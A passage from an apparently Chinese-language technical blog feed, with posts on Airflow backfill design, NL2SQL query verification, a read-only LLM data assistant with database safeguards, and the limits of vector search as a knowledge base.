<p>Airflow 2.4.1 的文档已经把这几个概念分开：DAG Run 有真实的 start&#x2F;end date，也有描述目标数据区间的 logical date；对于周期任务，logical date 标记 data interval 的开始。它还特别举了三个月历史数据回填的例子：这些 Run 可以在同一天真正启动，但每个 Run 处理不同的一天。</p>
<p>平台层面我会明确保存：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">data_interval_start / data_interval_end  处理的数据边界</span><br><span class="line">requested_at                             补数申请时间</span><br><span class="line">triggered_at                             调度器生成运行的时间</span><br><span class="line">started_at / finished_at                 执行器实际运行时间</span><br></pre></td></tr></table></figure>

<p>SQL 取数只能使用 data interval，资源排队分析用 started_at，补数审批审计用 requested_at。时区也要进入定义：业务日按 Asia&#x2F;Shanghai 切分，就不能让 UTC 日期字符串碰巧代替。跨夏令时地区更不能用固定 24 小时推导自然日。</p>
<h2 id="同一个分区可以有多个-Run"><a href="#同一个分区可以有多个-Run" class="headerlink" title="同一个分区可以有多个 Run"></a>同一个分区可以有多个 Run</h2><p>业务日期不是运行主键。10 月 1 日这个分区可以先由正常调度生成一次，修复代码后补跑一次，质量不通过再重跑一次。它们处理相同 data interval，却有不同代码、参数、提交人和结果。</p>
<p>我会把身份拆成四层：<code>job_id + data_interval + run_id + attempt_no</code>。<code>run_id</code> 表示一次有业务意义的运行；<code>attempt_no</code> 只表示这个 Run 在执行层的技术重试。网络抖动导致容器重启，可以增加 attempt；换了 SQL 再计算，则应该产生新的 Run。否则审计记录会把两次不同计算折叠成“第三次重试”。</p>
<p>Airflow 2.4.1 的 <code>BackfillJob</code> 会为指定时间范围组织 DAG Runs，并把新建 Run 标成 <code>DagRunType.BACKFILL_JOB</code>。源码还显示，创建 Run 时同时写入 execution date、data interval、实际 start date 和 run type。这正说明回填不是简单篡改一次普通实例的日期。</p>
<p>运行身份要一路传到引擎、日志和输出：Spark application、Flink job、Kubernetes Pod、YARN application 都要能反查平台 <code>run_id</code>。只在调度数据库里记一次成功，执行端留下的匿名 application 无法支撑故障定位。</p>
<h2 id="幂等不是一句“先删后写”"><a href="#幂等不是一句“先删后写”" class="headerlink" title="幂等不是一句“先删后写”"></a>幂等不是一句“先删后写”</h2><p>不少补数流程把幂等理解成：运行前删除目标分区，再执行 INSERT。这个策略在单任务、无并发、下游暂停时勉强可用，一旦任务失败或两个补数请求重叠，读方会看到空分区、半成品，甚至新旧结果互相覆盖。</p>
<p>更稳妥的做法是按 <code>run_id</code> 写隔离路径或新版本：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">warehouse/order_dt=2022-10-01/_runs/&lt;run_id&gt;/...</span><br></pre></td></tr></table></figure>

<p>运行结束后检查行数、主键重复、业务汇总、文件完整性和 schema，再原子切换分区元数据或 current pointer。发布失败时，旧版本继续对外；新版本保留一段时间供诊断，之后由清理任务回收。</p>
<p>数据库或 Hive 分区如果缺少真正的事务切换能力，也要尽量缩短不可见窗口，并把“计算完成”和“发布完成”分成两个状态。执行 SQL 成功不等于消费者已经拿到完整版本。</p>
<p>幂等还包含副作用。发送通知、调用外部 API、写搜索索引的任务不能因补数自动重复执行。DAG 要标明哪些节点是纯计算、哪些会产生外部副作用；补数默认只重建数据，副作用节点需单独授权或用业务幂等键去重。</p>
<h2 id="依赖应该等发布版本，而不是等一个绿色实例"><a href="#依赖应该等发布版本，而不是等一个绿色实例" class="headerlink" title="依赖应该等发布版本，而不是等一个绿色实例"></a>依赖应该等发布版本，而不是等一个绿色实例</h2><p>正常调度通常按业务周期串联：上游 10 月 1 日成功，下游同日开始。补数发生时，如果平台复用这个成功标志，可能出现两个相反的问题：下游认为历史实例早已成功，不再消费新结果；或者补数一启动就把正常依赖重置，整条生产链被意外拉起。</p>
<p>我会让依赖面对“可消费版本”而不是运行状态。上游新 Run 完成计算后先停在 <code>VERIFYING</code>，质量检查通过并完成原子发布，才产生一个新的 dataset&#x2F;version 事件。下游是否跟随这个事件，由补数请求明确选择：</p>
<ul>
<li>只修上游数据，不触发下游；</li>
<li>沿血缘展开受影响范围，经确认后逐层补跑；</li>
<li>发布新版本，但由下游 owner 在窗口内接管。</li>
</ul>
<p>补数范围也要先冻结。用户填 10 月 1 日到 10 月 31 日，调度器应展开为明确的 31 个 data intervals，并记录所用 DAG&#x2F;code version。执行过程中修改任务定义，不应让前十天和后十天悄悄使用不同版本；确需变更，就关闭旧请求并建立新请求。</p>
<h2 id="并发控制要针对历史洪峰"><a href="#并发控制要针对历史洪峰" class="headerlink" title="并发控制要针对历史洪峰"></a>并发控制要针对历史洪峰</h2><p>三个月日任务回填不是 90 个普通实例。它们会在短时间内争抢同一队列、数据库连接、对象存储带宽和下游写锁。正常每天一个实例时看不出的倾斜，会在批量补数中放大。</p>
<p>Airflow 的 <code>BackfillJob</code> 会跟踪 active runs，并在创建 DAG Run 时检查 DAG 的 <code>max_active_runs</code>。这个机制能限制运行数量，但平台仍需考虑全链路资源：一个 Run 内可能并发几十个 Task，不同 DAG 也会打到同一个源库。</p>
<p>我的做法是同时设三层闸门：补数请求的最大 active intervals、任务&#x2F;租户的执行并发、数据源或目标端的连接与吞吐配额。队列要能区分生产周期任务和历史回填，默认保证当日 SLA，再用剩余容量推进补数。</p>
<p>是否顺序执行不能只看性能。带 <code>depends_on_past</code>、累计快照或前一日状态的任务，必须按 data interval 串行；每天独立分区的无状态计算才适合并行。平台可以提供倒序、正序和并行策略，但选择依据要写进任务定义，而不是靠操作员临场猜。</p>
<h2 id="补数完成必须能对账"><a href="#补数完成必须能对账" class="headerlink" title="补数完成必须能对账"></a>补数完成必须能对账</h2><p>“31 个实例都成功”不是完成标准。我会先对请求级清单做对账：计划 31 个区间，实际创建多少 Run；每个 Run 最终发布了哪个版本；是否存在跳过、取消、重复发布或仍在重试的区间。</p>
<p>然后对数据做对账。历史数据的上游可能已变化，补跑结果和当初产出不相同并不必然是错，但差异必须能解释。平台至少保存输入版本&#x2F;快照、代码提交、参数摘要、输出统计和质量结果。没有可重现输入时，要明确标注“按当前上游重算”，不能暗示恢复了历史现场。</p>
<p>最后是下游闭环。若选择级联补跑，血缘范围、执行顺序、失败节点和最终发布版本都应归入同一个 request ID。回滚不是把状态点成失败，而是把消费指针切回上一个已验证版本，并记录哪些下游已经读取过错误数据。</p>
<p>补数据做得可靠，靠的不是多一个日期选择框。它需要独立的运行身份、清晰的时间语义、隔离输出、发布闸门和请求级对账。把这些边界建起来后，补数才是可控制的工程操作，而不是在生产历史上直接改写结果。</p>
<h2 id="对照源码与文档"><a href="#对照源码与文档" class="headerlink" title="对照源码与文档"></a>对照源码与文档</h2><ul>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/docs/apache-airflow/concepts/dags.rst#L166-L198">Apache Airflow 2.4.1：DAG Run、data interval 与 logical date 的定义</a></li>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/jobs/backfill_job.py#L56-L63">Apache Airflow 2.4.1 <code>BackfillJob</code>：回填一段时间范围内的 Task Instances</a></li>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/jobs/backfill_job.py#L300-L337">Apache Airflow 2.4.1：创建 Backfill DagRun 时写入 data interval、start date 与 run type</a></li>
<li><a href="https://github.com/apache/airflow/blob/7b979def75923ba28dd64e31e613043d29f34fce/airflow/jobs/backfill_job.py#L311-L316">Apache Airflow 2.4.1：Backfill 运行数受 <code>max_active_runs</code> 检查</a></li>
</ul>
]]></content>
      <categories>
        <category>数据开发</category>
      </categories>
      <tags>
        <tag>任务调度</tag>
        <tag>Apache Airflow</tag>
        <tag>补数据</tag>
      </tags>
  </entry>
  <entry>
    <title>NL2SQL 可以生成查询，但不能替你定义正确：一条 SQL 的验证边界</title>
    <url>//2023/01/05/nl2sql-verification-boundary/</url>
    <content><![CDATA[<p>NL2SQL 演示很容易做出效果：准备几张表，把 schema 放进上下文，模型很快能生成一条能跑的 SQL。真正接到企业数据平台后，问题不再是“有没有 SQL”，而是这条 SQL 为什么可信。字段名写对、语法能执行，只通过了最浅的一层检查。</p>
<p>我把 NL2SQL 的交付物定义为“可验证查询”，不是一段字符串。除了 SQL，还要带上所用口径、对象版本、权限范围、执行计划风险和结果断言。模型负责提出候选，平台负责决定它是否有资格执行和回答。</p>
<p class="article-diagram-scroll"><img src="/images/articles/nl2sql-verification-boundary.svg" class="lazyload" data-srcset="/images/articles/nl2sql-verification-boundary.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="NL2SQL 的验证边界"></p>
<span id="more"></span>

<h2 id="语法正确只排除了最低级错误"><a href="#语法正确只排除了最低级错误" class="headerlink" title="语法正确只排除了最低级错误"></a>语法正确只排除了最低级错误</h2><p>Spider 把 text-to-SQL 推进到跨领域、多表和复杂查询场景，也让问题更清楚：模型需要在未见过的数据库上理解 schema 与问题。PICARD 则在解码过程中拒绝不符合 SQL 语法和 schema 约束的 token，让生成结果保持可解析。</p>
<p>这些方法很重要，但工程上要理解其边界。下面两条 SQL 都能解析，也可能执行成功：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">FROM</span> orders <span class="keyword">WHERE</span> pay_time <span class="operator">&gt;=</span> <span class="string">&#x27;2023-01-01&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="keyword">DISTINCT</span> user_id) <span class="keyword">FROM</span> orders <span class="keyword">WHERE</span> create_time <span class="operator">&gt;=</span> <span class="string">&#x27;2023-01-01&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>用户问“今年新增付费用户数”时，哪一条都可能不对。需要先定义“新增”“付费”“用户”和时间口径：首次支付还是当年支付，退款是否剔除，业务时区是什么，订单与用户快照取哪个版本。Parser 无法从 SQL 结构里推导这些业务事实。</p>
<p>因此第一道边界不是 SQL 生成，而是问题规范化。平台把自然语言拆成指标、维度、时间范围、粒度、过滤条件和待确认项。关键口径缺失时，让系统追问或拒答，比猜一个看似合理的字段更专业。</p>
<h2 id="Schema-Link-不能只给表名和列名"><a href="#Schema-Link-不能只给表名和列名" class="headerlink" title="Schema Link 不能只给表名和列名"></a>Schema Link 不能只给表名和列名</h2><p>模型知道 <code>order_id</code> 和 <code>user_id</code>，并不等于知道它们如何关联。企业表里常有同名字段、拉链表、软删除、分区列、技术主键和业务主键。DDL 只提供类型，真正决定查询的还有约束与数据约定。</p>
<p>我会给 NL2SQL 构建一个最小授权语义包：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">可访问的表与列</span><br><span class="line">主外键或经过验证的 Join 路径</span><br><span class="line">字段业务说明、枚举和单位</span><br><span class="line">分区与快照规则</span><br><span class="line">指标定义及默认过滤条件</span><br><span class="line">已知的一对多关系与去重键</span><br></pre></td></tr></table></figure>

<p>上下文按问题召回，而不是把整个 Catalog 塞进去。表太多时，同名字段和无关关系会增加误选；表太少时，模型又会用现有字段硬凑答案。召回结果要带 object ID 与 metadata version，生成 SQL 后再反查，避免模型引用已删除或无权访问的对象。</p>
<p>Join 是最需要显式验证的地方。事实表连接退款明细、标签明细或多值维表时，行数可能倍增。系统至少检查 Join key 是否在允许关系中、左右基数是什么、聚合发生在 Join 前还是后。不能因为 SQL 有 <code>COUNT(DISTINCT ...)</code> 就认为重复已经被正确处理。</p>
<h2 id="Execution-Guided-也只能证明“这次能跑”"><a href="#Execution-Guided-也只能证明“这次能跑”" class="headerlink" title="Execution-Guided 也只能证明“这次能跑”"></a>Execution-Guided 也只能证明“这次能跑”</h2><p>Execution-Guided Decoding 会执行候选 SQL，利用运行错误或空结果筛掉一部分错误查询。工程实践里也常用 <code>LIMIT 1</code> 试跑。这能发现不存在的列、类型不匹配和部分运行时错误，却不能证明全量执行安全，更不能证明答案语义正确。</p>
<p>小样本执行可能绕过大分区、倾斜 key 或昂贵 Join。<code>LIMIT</code> 放在逻辑计划末端时，底层仍可能扫描全表。查询先经过 EXPLAIN，检查扫描分区、Join 类型、笛卡尔积、预计数据量、函数下推和资源代价。超过阈值就返回计划风险，让用户缩小范围或转异步任务。</p>
<p>实际执行放在只读账户与隔离队列中，设置 statement timeout、扫描量、并发和结果行数上限。模型没有数据库凭据，只能把候选提交给查询代理。即便检查器漏判，数据库权限和资源隔离仍是最后防线。</p>
<p>执行失败也不把原始数据库错误完整回填给模型。错误里可能包含对象名、路径、SQL 片段或敏感配置。平台把错误归类为 schema、permission、syntax、resource、timeout 等有限类型，保留 request ID 供人工诊断，再决定是否允许模型修正一次。</p>
<h2 id="结果验证需要业务断言"><a href="#结果验证需要业务断言" class="headerlink" title="结果验证需要业务断言"></a>结果验证需要业务断言</h2><p>一条 SQL 返回 42，不代表“42”回答了问题。系统应检查结果形状：用户问趋势，结果是否包含时间维度；问占比，分母是否非零、各项是否大致闭合；问唯一用户，查询是否在正确粒度去重；问环比，两个周期是否同长且时区一致。</p>
<p>我会为常用指标保存轻量断言：非负、取值范围、唯一键、枚举、总分关系、与基准口径的容差。第一次生成的 SQL 可以与人工认证查询在固定样本上做对照。差异不是直接让模型“再想想”，而是展示分区、Join 后行数和中间聚合，让问题落到可检查的环节。</p>
<p>空结果要单独处理。它可能表示业务确实为零，也可能是日期字段、时区、权限过滤或 Join 路径错了。平台可以执行一组便宜的探针：目标分区是否存在、过滤前是否有数据、关键维度是否命中。只有证据支持时，才把空集合解释为零。</p>
<p>最终答案同时返回 SQL、数据源&#x2F;快照时间、口径说明和限制。用户能打开查询复核，而不是只看到模型组织的一段自然语言。对于高风险指标，答案标成候选分析，不冒充认证报表。</p>
<h2 id="评测要按错误层分桶"><a href="#评测要按错误层分桶" class="headerlink" title="评测要按错误层分桶"></a>评测要按错误层分桶</h2><p>只统计 exact match 或执行成功率，无法指导平台改进。SQL 文本不同可能语义等价；能够执行的 SQL 也可能在 Join、时间或指标定义上错得很远。</p>
<p>我会把离线用例按至少五类标注：schema linking、Join path、filter&#x2F;time、aggregation&#x2F;grain、execution safety。每条失败记录模型上下文、候选 SQL、验证器结论和人工正确查询。上线后再加入真实问题的拒答率、追问率、执行失败率和人工纠错率。</p>
<p>回归环境必须固定数据库快照与 Catalog 版本。数据变化后结果值不同，不等于模型退化；schema 或统计信息变化后计划不同，也不能继续拿旧阈值比较。评测用例要同时固定 question、semantic context、engine version 和 expected invariants。</p>
<p>NL2SQL 的价值，是降低表达查询意图的门槛，不是跳过数据建模与验证。把模型放在候选生成位置，把正确性拆成可检查的层，系统才能在“答得快”和“答得可信”之间建立真正的工程边界。</p>
<h2 id="参考论文与文档"><a href="#参考论文与文档" class="headerlink" title="参考论文与文档"></a>参考论文与文档</h2><ul>
<li><a href="https://arxiv.org/abs/1809.08887">Spider：面向复杂跨领域 text-to-SQL 的数据集与评测</a></li>
<li><a href="https://arxiv.org/abs/1807.03100">Execution-Guided Decoding：用执行结果约束语义解析候选</a></li>
<li><a href="https://arxiv.org/abs/2109.05093">PICARD：在解码过程中增量约束可解析 SQL</a></li>
<li><a href="https://www.postgresql.org/docs/15/sql-explain.html">PostgreSQL 15 <code>EXPLAIN</code>：查看查询计划而不默认执行语句</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>NL2SQL</tag>
        <tag>SQL 验证</tag>
        <tag>数据语义</tag>
      </tags>
  </entry>
  <entry>
    <title>让大模型查询企业数据，第一版为什么只能做只读助手</title>
    <url>//2023/02/13/llm-readonly-data-assistant/</url>
    <content><![CDATA[<p>把大模型接进数据平台时，我不建议第一版就让它“自动完成数据操作”。企业数据查询本身已经包含权限、成本和口径风险；再开放 INSERT、DDL 或任务发布，错误会从一条答案扩散到真实系统状态。</p>
<p>第一版更合适的目标是只读数据助手：根据用户权限理解问题，生成候选查询，在受控环境执行，并把 SQL、结果依据和限制交给人复核。这里的“只读”不是 Prompt 里写一句“禁止修改”，而是从身份、解析、数据库权限到运行资源的多层约束。</p>
<p class="article-diagram-scroll"><img src="/images/articles/llm-readonly-data-assistant.svg" class="lazyload" data-srcset="/images/articles/llm-readonly-data-assistant.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="只读数据助手的执行隔离"></p>
<span id="more"></span>

<h2 id="模型不应该持有数据库凭据"><a href="#模型不应该持有数据库凭据" class="headerlink" title="模型不应该持有数据库凭据"></a>模型不应该持有数据库凭据</h2><p>最省事的接法，是把数据库连接配置交给一个模型可直接调用的函数。问题在于模型输出不稳定，Prompt 又会混入用户内容。一旦工具参数允许原始 SQL，模型就等同拥有该账户的全部能力。</p>
<p>我会把模型与数据库之间放一个查询代理。模型只提交结构化候选：数据源、SQL、参数、问题上下文；代理从服务端凭据系统选择固定只读身份，做权限和资源检查后执行。模型输入、输出、日志都不包含密码、token 或 JDBC URL 中的秘密。</p>
<p>凭据按数据域和环境隔离。开发、测试和生产不用同一个账户；财务、用户行为和运维元数据也不共享一个“大查询账户”。用户能访问什么，由 <code>user -&gt; policy -&gt; data objects</code> 决定，模型只能在授权后的 schema 子集上生成。</p>
<p>代理日志记录 credential profile ID，不记录秘密本身。轮换密码时不改 Prompt 或模型配置，停用某个数据域也能在策略层立即生效。这一层隔离让模型供应方、对话存储和数据库访问权限不必绑在一起。</p>
<h2 id="SELECT-白名单要基于-AST"><a href="#SELECT-白名单要基于-AST" class="headerlink" title="SELECT 白名单要基于 AST"></a>SELECT 白名单要基于 AST</h2><p>只检查 SQL 是否以 <code>SELECT</code> 开头很容易绕过。不同方言有 WITH、EXPLAIN、函数、副作用语句和多 statement；注释、大小写与字符串也会让正则判断失真。查询代理必须用目标引擎的 parser 得到 AST，只允许单条、明确的只读语句类型。</p>
<p>AST 检查至少覆盖：引用的 catalog&#x2F;schema&#x2F;table&#x2F;column、函数白名单、子查询、外部表函数、系统表和可能产生副作用的扩展语法。<code>SELECT dangerous_function()</code> 在语法上仍是 SELECT，函数权限不受控时照样能修改状态或读取服务器文件。</p>
<p>对象检查不能只靠模型生成时提供的 schema。代理用当前 Catalog 重新解析引用，应用列级脱敏、行级过滤和租户边界。敏感列即使没有出现在 SELECT，也可能通过 WHERE、ORDER BY、聚合结果或错误信息形成旁路，需要在数据权限设计中统一处理。</p>
<p>参数尽量绑定，不让模型拼接用户原文。日期、枚举和数值先按 schema 校验，再作为 prepared parameters 进入查询。无法参数化的标识符必须从授权对象集合选择，拒绝任意字符串透传。</p>
<h2 id="数据库权限是最终防线"><a href="#数据库权限是最终防线" class="headerlink" title="数据库权限是最终防线"></a>数据库权限是最终防线</h2><p>应用层检查会有 bug，数据库账户本身必须没有写权限。PostgreSQL 的 GRANT 可以把表的 SELECT 权限授予只读角色；<code>default_transaction_read_only</code> 或事务级 <code>READ ONLY</code> 则阻止不符合只读事务的命令。二者配合，而不是二选一。</p>
<p>只读也不代表无害。复杂查询可以耗尽 CPU、内存、临时磁盘和连接，锁住系统目录，或拖慢生产库。我会优先接只读副本、查询引擎或数仓资源组，不让交互式助手直接打主库。每个 request 设置 statement timeout、连接超时、并发、扫描量和结果行数上限。</p>
<p>PostgreSQL 15 提供 <code>statement_timeout</code>，超过时间会中止语句。平台还应在网关层设置总 deadline，因为数据库取消请求、网络读取和结果序列化都可能继续耗时。用户取消回答时，也要把 cancel 传到真实 query ID，不能只关闭浏览器流。</p>
<p>EXPLAIN 在执行前提供计划证据。检测无分区过滤的大表扫描、笛卡尔积、广播风险或预计行数过大，先拒绝或转异步。<code>EXPLAIN ANALYZE</code> 会真实执行语句，不能当成无副作用的普通检查；这一点要在工具契约里写清楚。</p>
<h2 id="返回结果也需要安全边界"><a href="#返回结果也需要安全边界" class="headerlink" title="返回结果也需要安全边界"></a>返回结果也需要安全边界</h2><p>限制查询行数不等于限制泄露。一行可以包含大文本、二进制或聚合后的敏感信息。结果层要限制列、单元格大小和总字节数，并应用掩码。模型通常只需要统计结果和少量样例，不应拿到完整明细再“自己总结”。</p>
<p>高基数字段有推断风险。用户反复改变过滤条件，可能通过 count 差分推断单个对象。对于人员、财务等敏感域，需要最小分组阈值、禁止某些维度组合，或只开放认证指标服务，而不是通用 SQL。</p>
<p>数据库错误也应净化。不存在的表名可以返回结构化 <code>OBJECT_NOT_ALLOWED</code>，但不要把完整 search path、服务器路径、内部 SQL 和堆栈交给模型。原始错误加密存入运维日志，通过 request ID 关联；用户侧只看到可行动的有限信息。</p>
<p>答案中标明结果截断、数据更新时间、时区、查询耗时与命中的权限策略。模型总结必须基于实际返回值，不能在执行失败后沿用先前候选继续作答。流式输出时，先完成查询与验证，再生成结论；不要先输出一句确定答案，后面才发现 SQL 失败。</p>
<h2 id="审计要能还原一次查询"><a href="#审计要能还原一次查询" class="headerlink" title="审计要能还原一次查询"></a>审计要能还原一次查询</h2><p>一次数据问答至少关联 user&#x2F;session&#x2F;request、模型版本、Prompt&#x2F;semantic context version、候选 SQL、解析后的对象、策略版本、数据库 query ID、时间与资源指标、结果摘要和最终回答。敏感结果不一定长期保存，但摘要哈希和可复核引用要在合规范围内保留。</p>
<p>我特别关注“最终执行的 SQL”。模型候选经过代理重写行级过滤、自动 LIMIT 或方言转换后，二者可能不同。审计只存原候选，会让后续复现得出另一个结果。应同时保存 candidate、rewritten、parameter bindings 与 engine-normalized query。</p>
<p>对于拒绝执行的请求也要留原因。对象越权、计划过大、语句类型不允许、超时与解析失败分别统计，才能知道系统在保护什么。所有失败都叫“模型生成错误”，会掩盖 Catalog 不全、权限配置错和资源阈值不合理。</p>
<p>回归集来自真实审计，但要脱敏和固定数据快照。每次调整 Prompt、模型、parser 或 policy 后，重新验证允许查询仍能通过、危险查询仍被拒绝、同一问题的口径没有漂移。</p>
<h2 id="从只读走向动作要逐项开放"><a href="#从只读走向动作要逐项开放" class="headerlink" title="从只读走向动作要逐项开放"></a>从只读走向动作要逐项开放</h2><p>只读助手稳定后，也不意味着直接给写权限。下一步可以先生成变更计划或草稿，让人确认后由确定性服务执行；再开放低风险、可逆且范围明确的动作。例如创建临时查询、保存个人视图，比删除分区或发布生产任务更适合自动化。</p>
<p>每个动作工具都需要窄参数、对象级授权、幂等键、预览、审批与回滚。模型负责选择工具和组织参数，执行系统负责验证状态前置条件。权限应按能力一项项增加，不能从“只读账户”直接跳到“管理员账户”。</p>
<p>第一版选择只读，是为了建立可扩展的执行底座，并非刻意保守。模型没有秘密，SQL 经过 AST 和 Catalog 校验，数据库角色兜底，资源与结果受限，审计能复现；这些能力以后同样会保护写操作。跳过它们，越早开放动作，越早把一次模型错误变成生产事故。</p>
<h2 id="对照官方文档"><a href="#对照官方文档" class="headerlink" title="对照官方文档"></a>对照官方文档</h2><ul>
<li><a href="https://www.postgresql.org/docs/15/sql-grant.html">PostgreSQL 15 <code>GRANT</code>：表、列与角色权限语义</a></li>
<li><a href="https://www.postgresql.org/docs/15/runtime-config-client.html#GUC-DEFAULT-TRANSACTION-READ-ONLY">PostgreSQL 15：<code>default_transaction_read_only</code> 与会话默认事务模式</a></li>
<li><a href="https://www.postgresql.org/docs/15/runtime-config-client.html#GUC-STATEMENT-TIMEOUT">PostgreSQL 15：<code>statement_timeout</code> 的执行超时定义</a></li>
<li><a href="https://www.postgresql.org/docs/15/sql-explain.html">PostgreSQL 15 <code>EXPLAIN</code>：计划检查与 ANALYZE 会真实执行语句的区别</a></li>
</ul>
]]></content>
      <categories>
        <category>AI Agent 工程化</category>
      </categories>
      <tags>
        <tag>NL2SQL</tag>
        <tag>数据助手</tag>
        <tag>数据库安全</tag>
      </tags>
  </entry>
  <entry>
    <title>向量检索不是知识库：最近邻之外还缺哪些工程环节</title>
    <url>//2023/01/20/vector-search-is-not-knowledge-base/</url>
    <content><![CDATA[<p>把文档切块、算 embedding、写进向量索引，再接一个生成模型，几天就能搭出知识问答 Demo。这个 Demo 会让人产生一个错觉：只要相似度搜得准，企业知识库就建成了。实际运行一段时间后，问题往往不在向量库，而在知识从哪里来、何时失效、谁能看、答案引用了什么。</p>
<p>我把向量检索当成候选召回器。它回答的是“哪些片段在表示空间里接近这个问题”，不负责证明片段仍然有效，也不负责解决权限、冲突和业务口径。知识库是包含摄取、治理、检索、生成和反馈的一整条链路。</p>
<p class="article-diagram-scroll"><img src="/images/articles/vector-search-is-not-knowledge-base.svg" class="lazyload" data-srcset="/images/articles/vector-search-is-not-knowledge-base.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="向量召回只是知识问答链路的一段"></p>
<span id="more"></span>

<h2 id="最近邻解决的是召回效率"><a href="#最近邻解决的是召回效率" class="headerlink" title="最近邻解决的是召回效率"></a>最近邻解决的是召回效率</h2><p>DPR 用双编码器分别表示问题和段落，再用向量相似度做开放域问答检索；RAG 把检索到的文档作为生成模型的外部记忆；FAISS 与 HNSW 关注的是大规模相似向量搜索效率和精度。它们分别解决了重要问题，但没有声称一个向量索引自动等于企业知识治理。</p>
<p>企业场景里的失败常常很朴素。用户问“生产任务默认重试几次”，索引召回了三份很像的片段：两年前的制度、测试环境说明、一个故障复盘里的临时参数。相似度最高的那段可能恰好最不适用。</p>
<p>检索对象必须带结构化身份：<code>source_id</code>、<code>document_version</code>、<code>section_path</code>、<code>valid_from/to</code>、environment、owner、ACL 和 ingestion time。向量只负责内容近似，过滤器先按访问身份、环境与有效期收窄范围。没有这些字段，召回分数越高，错误答案反而越自信。</p>
<p>我还会保留原文位置和内容哈希。答案引用某个 chunk 时，可以回到原文的标题、段落与版本；文档更新后，旧 chunk 能被准确撤下，而不是重新导入一份后让新旧内容一起命中。</p>
<h2 id="切块决定了能否回答，不是固定字数参数"><a href="#切块决定了能否回答，不是固定字数参数" class="headerlink" title="切块决定了能否回答，不是固定字数参数"></a>切块决定了能否回答，不是固定字数参数</h2><p>固定每 500 字切一块，是最方便实现的方案，也最容易把定义和条件拆开。一段写“默认保留 30 天”，下一段才说明“仅适用于离线任务日志”，模型只拿到前半段就会把结论扩大到所有数据。</p>
<p>我更关注问题的最小证据单元。标题层级、列表、代码块、表格、接口定义和段落之间的指代都应参与切分。一个 chunk 要尽量包含结论、适用条件和必要上下文；过长时按语义子段拆分，同时给每段附上 ancestor headings。</p>
<p>表格尤其不能按纯文本行随意切。列标题丢失后，<code>30</code> 不知道是天数、次数还是容量。代码与配置也要保留文件路径、版本和相邻注释。对数据 Catalog，表、列、指标、关系本来就是结构化对象，先用对象模型检索，再把说明文本用于补充，不必全部压成匿名段落。</p>
<p>切块质量可以用问题反推：准备真实问题，标注最小充分证据，检查它能否完整落在可召回单元中。chunk size 只是实验变量，不是知识库设计原则。</p>
<h2 id="向量召回需要和其他信号协作"><a href="#向量召回需要和其他信号协作" class="headerlink" title="向量召回需要和其他信号协作"></a>向量召回需要和其他信号协作</h2><p>语义相近不代表关键词精确。错误码、表名、类名、配置键和版本号往往需要 lexical match；“DataX 速度限制”与“channel speed byte”在表达上相关，但用户给出完整参数名时，关键词命中更可靠。</p>
<p>我通常并行做三路候选：向量召回自然语言语义，BM25&#x2F;倒排索引处理精确词，结构化查询处理对象关系与过滤。候选合并后再重排，特征至少包括语义分数、关键词命中、文档权威级别、新鲜度、环境匹配和 ACL。</p>
<p>score 不能直接跨索引比较。不同 embedding 模型、索引参数和 query 长度会改变分布。阈值要在标注集上校准，并随 index version 保存。更换模型时做双索引离线回放，再灰度切流；直接重算所有向量并覆盖，出现回退后没有可比较的旧版本。</p>
<p>多路召回仍可能拿不到答案。系统需要识别证据不足：top-k 都低分、片段互相冲突、问题要求的时间晚于知识更新时间，或只有二手说明没有正式来源。此时返回“当前知识中无法确认”并列出检索范围，比用常识填空更有价值。</p>
<h2 id="权限必须在检索前后都检查"><a href="#权限必须在检索前后都检查" class="headerlink" title="权限必须在检索前后都检查"></a>权限必须在检索前后都检查</h2><p>把所有文档放进同一个向量库，然后在答案返回前过滤敏感词，不是权限控制。模型已经看到无权内容，即便最终文本没有逐字输出，也可能通过摘要、推断或后续问答泄露。</p>
<p>检索前按用户身份计算允许的 document&#x2F;object set，向量查询只在这个范围执行。若索引系统的过滤能力不足，至少按安全域分索引，不能先全局 top-k 再删掉无权结果，因为删除后剩下的候选也未必是该用户范围内真正的 top-k。</p>
<p>生成前再做一次 ACL 校验，防止索引元数据与源系统权限不同步。答案返回引用，点击时由源系统重新鉴权。权限快照、用户身份、命中的 source IDs 和 policy version 进入审计日志，才能解释“为什么这个人当时看到了这段内容”。</p>
<p>删除也要闭环。源文档撤销权限或被删除后，事件触发 chunk tombstone；检索层立即过滤 tombstoned IDs，后台再清理向量。依赖异步重建完成才生效，会留下几个小时甚至几天的泄露窗口。</p>
<h2 id="答案需要证据，不只需要流畅"><a href="#答案需要证据，不只需要流畅" class="headerlink" title="答案需要证据，不只需要流畅"></a>答案需要证据，不只需要流畅</h2><p>RAG 的生成阶段可能忽略检索片段、混合多份冲突内容，或把文档没有说的推断写成事实。我会要求答案中的关键结论绑定 source span，并在生成后检查引用是否真的支持句子。</p>
<p>引用不是在段末放一个文档链接就结束。它应至少带标题、版本、段落位置和有效时间。多个来源冲突时，不让模型自行投票：优先规则由知识治理定义，例如正式制度高于聊天记录、当前版本高于历史版本；无法判定则把冲突展示出来。</p>
<p>生成上下文也要控制重复。top-k 很可能来自同一文档的相邻 chunk，挤掉其他证据。先按 source&#x2F;section 去重，再在 token 预算内选择覆盖不同子问题的片段。对一个包含三个条件的问题，不能让相似度最高的单个片段占满全部上下文。</p>
